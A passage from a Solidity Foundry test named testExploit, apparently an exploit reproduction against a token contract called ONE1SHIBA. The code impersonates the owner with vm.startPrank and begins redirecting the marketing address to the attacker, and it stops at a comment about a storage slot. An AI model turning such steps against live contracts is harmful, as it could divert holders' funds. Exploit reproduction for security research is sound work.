    function testExploit() public {
        uint256 initialAttackerBalance = address(this).balance;

        // Step 1: Get the current owner
        address owner = ONE1SHIBA(TARGET).owner();

        // Step 2: Impersonate the owner
        vm.startPrank(owner);

        // Step 3: Change marketing address to attacker
        // The marketing address is stored at a specific slot
